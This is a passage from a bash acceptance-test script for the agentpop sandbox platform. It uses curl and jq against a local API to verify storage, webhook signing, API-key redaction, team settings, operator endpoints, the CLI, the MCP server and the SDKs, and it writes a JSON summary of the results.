fi

storage_response="$(curl -fsS -X POST "${api_url}/v1/storages" -H 'content-type: application/json' --data '{"name":"qa-storage","endpoint":"https://s3.example.test","bucket":"qa","region":"us-east-1","pathStyle":true,"accessKey":"qa-access","secretKey":"qa-secret"}' 2>"${tmp_dir}/storage.err")" || true
storage_id="$(jq -r '.id // empty' <<<"${storage_response}")"
if [[ -n "${storage_id}" ]] && ! jq -e 'has("secretKey") or has("accessKey")' <<<"${storage_response}" >/dev/null; then
  record STO-001 PASS "storage" "Storage registration persists without returning credentials"
else
  record STO-001 FAIL "storage" "Storage creation or credential redaction failed"
fi
if [[ -n "${storage_id}" && -n "${sandbox_id}" ]]; then
  check STO-002 "storage" "Storage attachment is persisted" bash -c "curl -fsS -X POST '${api_url}/v1/storages/${storage_id}/attachments' -H 'content-type: application/json' --data '{\"sandboxId\":\"${sandbox_id}\"}' | jq -e '.attached==1'"
  record STO-003 PARTIAL "storage / data plane" "Attachment is metadata; bucket is not mounted or credential-brokered into the guest"
  check STO-004 "storage" "Storage can be detached" bash -c "curl -fsS -X DELETE '${api_url}/v1/storages/${storage_id}/attachments/${sandbox_id}' | jq -e '.attached==0'"
fi

AGENTPOP_WEBHOOK_CAPTURE="${tmp_dir}/webhook.json" AGENTPOP_WEBHOOK_PORT=18765 \
  python3 scripts/webhook-receiver.py >/dev/null 2>&1 &
webhook_pid="$!"
sleep 0.4
webhook_response="$(curl -fsS -X POST "${api_url}/v1/webhooks" -H 'content-type: application/json' --data '{"url":"http://host.docker.internal:18765/hook","events":["sandbox.create"]}' 2>"${tmp_dir}/webhook.err")" || true
webhook_id="$(jq -r '.webhook.id // empty' <<<"${webhook_response}")"
if [[ -n "${webhook_id}" ]] && jq -e '.secret|length>20' <<<"${webhook_response}" >/dev/null; then
  record WHK-001 PASS "webhooks" "Webhook created and signing secret revealed once"
  check WHK-002 "webhooks" "Test delivery reaches receiver" bash -c "curl -fsS -X POST '${api_url}/v1/webhooks/${webhook_id}/test' | jq -e '.delivered==true and .status==204'"
check WHK-003 "webhooks / security" "Delivery includes event and versioned HMAC signature headers" bash -c "jq -e '.event==\"webhook.test\" and (.signature|test(\"^t=[0-9]+,v1=[a-f0-9]{64}$\"))' '${tmp_dir}/webhook.json'"
else
  record WHK-001 FAIL "webhooks" "Webhook creation failed"
fi

check AUD-001 "audit" "Customer audit ledger records mutations" bash -c "curl -fsS '${api_url}/v1/audit-events' | jq -e '(.items|length)>10'"
check TEAM-001 "settings / team" "Member invitation persists pending member" bash -c "curl -fsS -X POST '${api_url}/v1/members' -H 'content-type: application/json' --data '{\"email\":\"qa-member@example.test\",\"role\":\"Viewer\"}' | jq -e '.email==\"qa-member@example.test\" and .pending==true'"
check TEAM-002 "settings / team" "Member role update persists" bash -c "curl -fsS -X PATCH '${api_url}/v1/members/qa-member%40example.test' -H 'content-type: application/json' --data '{\"role\":\"Developer\"}' | jq -e '.role==\"Developer\"'"
check TEAM-003 "settings / team" "Member removal succeeds" curl -fsS -X DELETE "${api_url}/v1/members/qa-member%40example.test"

key_response="$(curl -fsS -X POST "${api_url}/v1/api-keys" -H 'content-type: application/json' --data "$(jq -cn --arg n "${api_key_name}" '{name:$n,scopes:["sandbox:read","sandbox:exec"]}')" 2>"${tmp_dir}/key.err")" || true
api_key_id="$(jq -r '.key.id // empty' <<<"${key_response}")"
if [[ -n "${api_key_id}" ]] && jq -e '.secret|startswith("pop_")' <<<"${key_response}" >/dev/null; then
  record KEY-001 PASS "developer / API keys" "Scoped API key created and secret revealed once"
  check KEY-002 "developer / API keys" "Key listing omits secret material" bash -c "curl -fsS '${api_url}/v1/api-keys' | jq -e --arg id '${api_key_id}' 'map(select(.id==\$id and (has(\"secret\")|not)))|length==1'"
else
  record KEY-001 FAIL "developer / API keys" "API key creation failed"
fi

check QUOTA-001 "settings / quotas" "Quota limits are queryable" bash -c "curl -fsS '${api_url}/v1/quotas' | jq -e 'length>0'"
check QUOTA-002 "settings / quotas" "Quota increase request persists" bash -c "curl -fsS -X POST '${api_url}/v1/quota-requests' -H 'content-type: application/json' --data '{\"message\":\"acceptance\"}' | jq -e '.status==\"open\"'"
check PROJ-001 "settings / project" "Project update persists" bash -c "curl -fsS -X PATCH '${api_url}/v1/project' -H 'content-type: application/json' --data '{\"name\":\"local\",\"defaultIdleSeconds\":1800}' | jq -e '.defaultIdleSeconds==1800'"

login_response="$(curl -fsS -X POST "${api_url}/private/v1/auth/login" -H 'content-type: application/json' --data "$(jq -cn --arg e "${admin_email}" --arg p "${admin_password}" '{email:$e,password:$p}')" 2>"${tmp_dir}/admin.err")" || true
admin_token="$(jq -r '.token // empty' <<<"${login_response}")"
if [[ -n "${admin_token}" ]]; then
  record ADM-001 PASS "operator / login" "Owner-only login returns a private session"
  check ADM-002 "operator console" "operator session" bash -c "curl -fsS '${api_url}/private/v1/auth/session' -H 'authorization: Bearer ${admin_token}' | jq -e '.email==\"${admin_email}\"'"
  check ADM-003 "operator console" "operations overview" bash -c "curl -fsS '${api_url}/private/v1/overview' -H 'authorization: Bearer ${admin_token}' | jq -e '.desiredSandboxes>=1 and .host.healthy==true'"
  check ADM-004 "operator console" "control-plane detail" bash -c "curl -fsS '${api_url}/private/v1/control-plane' -H 'authorization: Bearer ${admin_token}' | jq -e '.healthy==true and (.components|length)>0'"
  check ADM-005 "operator console" "host inventory" bash -c "curl -fsS '${api_url}/private/v1/data-plane/hosts' -H 'authorization: Bearer ${admin_token}' | jq -e '(.items|length)==1 and .items[0].healthy==true'"
  check ADM-006 "operator console" "runtime inventory" bash -c "curl -fsS '${api_url}/private/v1/data-plane/sandboxes' -H 'authorization: Bearer ${admin_token}' | jq -e '(.items|length)>=1'"
  check ADM-007 "operator console" "private audit ledger" bash -c "curl -fsS '${api_url}/private/v1/audit' -H 'authorization: Bearer ${admin_token}' | jq -e '(.items|length)>0'"
  check ADM-008 "operator console" "redacted private configuration" bash -c "curl -fsS '${api_url}/private/v1/config' -H 'authorization: Bearer ${admin_token}' | jq -e '.secretValuesExposed==false'"
  check ADM-009 "operator / data plane" "Reconcile reports desired versus observed runtime" bash -c "curl -fsS -X POST '${api_url}/private/v1/reconcile' -H 'authorization: Bearer ${admin_token}' | jq -e '.result==\"ok\"'"
  check ADM-010 "operator / logout" "Private session can be revoked" curl -fsS -X POST "${api_url}/private/v1/auth/logout" -H "authorization: Bearer ${admin_token}"
else
  record ADM-001 FAIL "operator / login" "Owner login failed"
fi

if [[ -x .local/bin/agentpop ]]; then
  check CLI-001 "CLI" "CLI reads the live sandbox inventory" env AGENTPOP_API_URL="${api_url}" .local/bin/agentpop sandbox list
  check CLI-002 "CLI" "CLI searches the canonical image catalog" bash -c "AGENTPOP_API_URL='${api_url}' .local/bin/agentpop image list --kind sandbox --query python | jq -e '.items|map(select(.kind==\"sandbox\"))|length>0'"
else
  record CLI-001 FAIL "CLI" ".local/bin/agentpop is not built"
  record CLI-002 FAIL "CLI" ".local/bin/agentpop is not built"
fi
if [[ -x .local/bin/agentpop-mcp ]]; then
  check MCP-001 "MCP" "MCP initialize and discovery expose canonical image, connector-tool, and secret methods" bash -c "printf '%s\n%s\n' '{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"initialize\",\"params\":{\"protocolVersion\":\"2025-11-25\",\"capabilities\":{},\"clientInfo\":{\"name\":\"acceptance\",\"version\":\"1\"}}}' '{\"jsonrpc\":\"2.0\",\"id\":2,\"method\":\"tools/list\",\"params\":{}}' | AGENTPOP_API_URL='${api_url}' .local/bin/agentpop-mcp | jq -s -e '.[0].result.serverInfo.name==\"agentpop\" and (.[1].result.tools|map(.name)|index(\"agentpop_list_images\"))!=null and (.[1].result.tools|map(.name)|index(\"agentpop_deploy_image\"))!=null and (.[1].result.tools|map(.name)|index(\"agentpop_list_connector_tools\"))!=null and (.[1].result.tools|map(.name)|index(\"agentpop_set_sandbox_secrets\"))!=null'"
else
  record MCP-001 FAIL "MCP" ".local/bin/agentpop-mcp is not built"
fi
if [[ -f packages/sdk/dist/index.js && -f packages/sdk/dist/index.d.ts && -f sdk/python/agentpop/client.py && -f sdk/go/agentpop/client.go ]]; then
  record SDK-001 PASS "SDKs" "TypeScript, Python, and Go SDK source/artifacts are present"
else
  record SDK-001 FAIL "SDKs" "One or more SDK artifacts are missing"
fi

record AUTH-001 PARTIAL "customer authentication" "GitHub OAuth now uses a signed server session and hosted allowlist; email/Google identity and tenant-scoped resources remain unfinished"
if [[ -f "${evidence_dir}/ui/latest.json" ]] && jq -e '.summary.fail==0 and .summary.pass>0' "${evidence_dir}/ui/latest.json" >/dev/null; then
  ui_pass="$(jq -r '.summary.pass' "${evidence_dir}/ui/latest.json")"
  record UI-001 PASS "UI interaction audit" "${ui_pass} browser route/control checks passed with screenshots"
else
  record UI-001 PARTIAL "UI interaction audit" "Run pnpm qa:ui to exercise every route/control with browser evidence"
fi
record FIRE-001 SKIP-LIVE "Firecracker data plane" "macOS has no KVM; Docker compatibility plane passed. Run on Linux/KVM for microVM proof"

cp "${result_file}" "${latest_file}"
jq -s \
  --arg runId "${run_id}" \
  --arg generatedAt "$(date -u +%FT%TZ)" \
  --argjson pass "${pass_count}" \
  --argjson fail "${fail_count}" \
  --argjson partial "${partial_count}" \
  --argjson skip "${skip_count}" \
  '{runId:$runId,generatedAt:$generatedAt,summary:{pass:$pass,fail:$fail,partial:$partial,skipLive:$skip},results:.}' \
  "${result_file}" >"${evidence_dir}/summary-${run_id}.json"
cp "${evidence_dir}/summary-${run_id}.json" "${evidence_dir}/latest.json"

printf '\nEvidence: %s\nPASS=%d FAIL=%d PARTIAL=%d SKIP-LIVE=%d\n' \
  "${evidence_dir}/latest.json" "${pass_count}" "${fail_count}" "${partial_count}" "${skip_count}"

if (( fail_count > 0 )); then
  exit 1
fi
